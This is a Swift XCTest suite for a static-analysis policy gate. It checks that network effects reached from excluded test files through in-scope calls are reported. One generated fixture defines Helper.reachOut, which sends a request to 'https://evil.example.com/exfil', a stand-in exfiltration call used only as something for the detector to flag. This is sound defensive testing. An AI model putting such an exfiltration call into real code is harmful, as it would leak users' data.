import XCTest
import Foundation

/// **THE RESIDUAL FILED IN b6d3bf3, NOW CLOSED.** The ⟨0.29⟩ peek re-scans an excluded file in a CHILD
/// process given ONLY the excluded list (`--peek-excluded`) — so when the excluded file's own effect
/// reaches through a call into a file that stayed IN SCOPE, the child has no local declaration for the
/// callee and the call resolves to nothing. MEASURED before this fix, directly on the child's own output
/// (`--peek-excluded` pointed at one test-source file whose only body is a call into an in-scope
/// `Helper.reachOut`): `analyzed.count: 1`, `functions: []` — the calling function is not merely
/// unresolved, it is ABSENT, identical to a provably pure one. Downstream that made `outOfScope` stay `[]`
/// and the gate answer `ok: true` over a tree where a genuinely-excluded file reaches a denied effect: a
/// CARDINAL SIN (a false all-clear), not merely a disclosure gap — the ⟨0.30⟩ INCOMPLETE machinery never
/// gets a chance to fire because the finding it would key on was never produced.
///
/// THE FIX: the parent now also writes its own `sourcePaths` (the files its PRIMARY scan actually read) to
/// a second list and hands the child both (`--peek-excluded` + `--peek-context`, see `peekContextPath`'s
/// doc in main.swift). The child unions them for `analyze()` — so a call from an excluded file into a
/// context file resolves exactly as it would in an ordinary scan — but the parent's consumption loop
/// still attributes a finding ONLY when the carrying function's `loc` matches the ORIGINAL excluded list,
/// never a context file, so an in-scope function that happens to match a scope-matching rule is never
/// double-reported under the excluded slice's identity.
///
/// Four rows: the defect (now caught), the over-charge control (an excluded file with no cross-file reach
/// must look exactly as it did before this rung), the attribution control (a finding lands on the excluded
/// caller, never the in-scope callee, even when a rule's scope would match both), and a larger excluded
/// set staying well inside the peek's existing 120s deadline.
final class PeekCrossFileResolutionProcessTests: XCTestCase {

    private func bin() throws -> URL { try ProcessHarness.binaryURL(for: Self.self) }

    /// `Helper.reachOut` is a normal in-scope production function performing `Net`. `RunnerN` is a
    /// test-source file (imports XCTest, so `isTestSource` excludes it wherever it sits — a GENUINE
    /// exclusion, no bug in the classifier being exercised here) whose only body is a call INTO Helper —
    /// the shape the residual names. `helperMatchesScope` controls whether the deny rule's scope also
    /// matches `Helper.reachOut` directly, which the attribution control needs and the others do not.
    private func fixture(runnerCount: Int = 1) throws -> URL {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("candor-swift-peekxfile-\(UUID().uuidString)")
        let src = root.appendingPathComponent("Sources/App")
        try FileManager.default.createDirectory(at: src, withIntermediateDirectories: true)
        try """
        // swift-tools-version: 6.0
        import PackageDescription
        let package = Package(name: "App", targets: [.executableTarget(name: "App")])
        """.write(to: root.appendingPathComponent("Package.swift"), atomically: true, encoding: .utf8)
        try """
        import Foundation
        struct Helper {
            static func reachOut() {
                let url = URL(string: "https://evil.example.com/exfil")!
                URLSession.shared.dataTask(with: url) { _, _, _ in }.resume()
            }
        }
        """.write(to: src.appendingPathComponent("Helper.swift"), atomically: true, encoding: .utf8)
        for i in 0..<runnerCount {
            try """
            import XCTest
            struct Runner\(i) {
                static func run() { Helper.reachOut() }
            }
            """.write(to: src.appendingPathComponent("RunnerTests\(i).swift"), atomically: true, encoding: .utf8)
        }
        return root
    }

    private func scan(_ tree: URL, policy: String, out: String) throws -> (out: String, err: String, code: Int32) {
        let pol = tree.appendingPathComponent(".policy")
        try policy.write(to: pol, atomically: true, encoding: .utf8)
        return try ProcessHarness.run(try bin(),
                                       [tree.path, "--policy", pol.path,
                                        "--out", tree.appendingPathComponent(out).path],
                                       cwd: tree)
    }

    private func outOfScope(_ report: URL) throws -> [[String: Any]] {
        let d = try JSONSerialization.jsonObject(with: Data(contentsOf: report)) as? [String: Any]
        return (d?["outOfScope"] as? [[String: Any]]) ?? []
    }

    // MARK: - 1. The defect, now caught

    /// Scoped so ONLY `Runner0` matches (`Helper` does not begin with `Runner`) — the main scan never
    /// touches `Runner0.run` at all (excluded), so the ONLY route by which this reach can be judged is the
    /// peek resolving the call into Helper. Before this fix: exit 0, `outOfScope: []`. Now: exit 2,
    /// `Runner0.run` named with `Net`, attributed to `test-source`.
    func testExcludedFileReachingADeniedEffectThroughAnInScopeCallIsDisclosed() throws {
        let tree = try fixture(runnerCount: 1)
        defer { try? FileManager.default.removeItem(at: tree) }
        let r = try scan(tree, policy: "deny Net Runner\n", out: "defect")
        XCTAssertEqual(r.code, 2, "a genuinely excluded file reaches a denied effect through an in-scope "
                       + "call — the verdict must be INCOMPLETE, never a clean pass: \(r.out)\n\(r.err)")
        let found = try outOfScope(tree.appendingPathComponent("defect.App.Swift.json"))
        XCTAssertEqual(found.count, 1, "exactly the excluded caller, named once: \(found)")
        XCTAssertEqual(found.first?["fn"] as? String, "Runner0.run")
        XCTAssertEqual(found.first?["class"] as? String, "test-source")
        XCTAssertEqual((found.first?["effects"] as? [String]) ?? [], ["Net"])
    }

    /// The same reach, unresolved directly on the child's own `--peek-excluded` output (no `--peek-context`
    /// given) — pinning the MECHANISM the row above exercises end-to-end, not just its final verdict. If
    /// this ever answers non-empty `functions` again outside the parent's orchestration, some other path
    /// started giving the child context it should only get through `--peek-context`.
    func testTheChildAloneWithoutContextStillLosesTheCall() throws {
        let tree = try fixture(runnerCount: 1)
        defer { try? FileManager.default.removeItem(at: tree) }
        let listFile = tree.appendingPathComponent("peeklist.txt")
        try tree.appendingPathComponent("Sources/App/RunnerTests0.swift").path
            .write(to: listFile, atomically: true, encoding: .utf8)
        let r = try ProcessHarness.run(try bin(), [tree.path, "--peek-excluded", listFile.path, "--json"], cwd: tree)
        let d = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
        XCTAssertEqual((d?["analyzed"] as? [String: Any])?["count"] as? Int, 1)
        XCTAssertEqual((d?["functions"] as? [Any])?.count ?? -1, 0,
                       "documents the exact mechanism: unresolved-and-dropped, not unresolved-and-Unknown")
    }

    // MARK: - 2. Over-charge control

    /// An excluded file whose ONLY effect is entirely SELF-CONTAINED — no call into any in-scope file.
    /// Feeding the child a bigger resolution context must not change this AT ALL: the finding, its class
    /// and its effect set must be exactly what a narrow (pre-fix) peek already reported.
    func testAnExcludedFileWithNoCrossFileReachIsUnaffected() throws {
        let root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("candor-swift-peekxfile-nocross-\(UUID().uuidString)")
        let src = root.appendingPathComponent("Sources/App")
        try FileManager.default.createDirectory(at: src, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        try """
        // swift-tools-version: 6.0
        import PackageDescription
        let package = Package(name: "App", targets: [.executableTarget(name: "App")])
        """.write(to: root.appendingPathComponent("Package.swift"), atomically: true, encoding: .utf8)
        try "struct Helper { static func pureThing() -> Int { 42 } }\n"
            .write(to: src.appendingPathComponent("Helper.swift"), atomically: true, encoding: .utf8)
        try """
        import XCTest
        import Foundation
        struct Runner {
            static func run() {
                let url = URL(string: "https://x.example.com")!
                URLSession.shared.dataTask(with: url) { _, _, _ in }.resume()
            }
        }
        """.write(to: src.appendingPathComponent("RunnerTests.swift"), atomically: true, encoding: .utf8)
        let r = try scan(root, policy: "deny Net Runner\n", out: "nocross")
        XCTAssertEqual(r.code, 2)
        let found = try outOfScope(root.appendingPathComponent("nocross.App.Swift.json"))
        XCTAssertEqual(found.count, 1)
        XCTAssertEqual(found.first?["fn"] as? String, "Runner.run")
        XCTAssertEqual(found.first?["class"] as? String, "test-source")
        XCTAssertEqual((found.first?["effects"] as? [String]) ?? [], ["Net"])
    }

    // MARK: - 3. Attribution control

    /// An UNSCOPED `deny Net` matches BOTH `Helper.reachOut` (in-scope, already a primary-scan violation)
    /// AND the excluded `Runner0.run` that reaches it. `outOfScope` must name ONLY the excluded caller —
    /// never duplicate the in-scope callee the main gate already judged, which would be the ⟨0.29⟩
    /// hardening rounds' attribution defect reappearing one call away.
    func testAttributionStaysWithTheExcludedFileNotTheInScopeCallee() throws {
        let tree = try fixture(runnerCount: 1)
        defer { try? FileManager.default.removeItem(at: tree) }
        let r = try scan(tree, policy: "deny Net\n", out: "attrib")
        XCTAssertEqual(r.code, 1, "Helper.reachOut is a direct, in-scope violation on its own: \(r.err)")
        XCTAssertTrue(r.err.contains("Helper.reachOut"), "the primary gate still catches it directly: \(r.err)")
        let found = try outOfScope(tree.appendingPathComponent("attrib.App.Swift.json"))
        XCTAssertEqual(found.count, 1, "no double count: \(found)")
        XCTAssertEqual(found.first?["fn"] as? String, "Runner0.run",
                       "the excluded CALLER, not the in-scope callee it reaches through: \(found)")
    }

    // MARK: - 4. Timeout control

    /// 30 excluded test-source files, each reaching the same in-scope `Helper.reachOut` — correctness at a
    /// width the narrow (pre-fix) peek never had to resolve, completing well inside the peek's existing
    /// 120s child-process deadline (`PeekTimedOut`, main.swift) rather than regressing into it.
    func testALargerExcludedSetResolvesWellWithinThePeeksDeadline() throws {
        let tree = try fixture(runnerCount: 30)
        defer { try? FileManager.default.removeItem(at: tree) }
        let started = Date()
        let r = try scan(tree, policy: "deny Net Runner\n", out: "wide")
        let elapsed = Date().timeIntervalSince(started)
        XCTAssertEqual(r.code, 2)
        let found = try outOfScope(tree.appendingPathComponent("wide.App.Swift.json"))
        XCTAssertEqual(found.count, 30, "every excluded caller resolved and named: \(found.count)")
        XCTAssertLessThan(elapsed, 30, "nowhere near the 120s child deadline — a real regression toward "
                          + "the old failure mode would show up here first")
    }
}
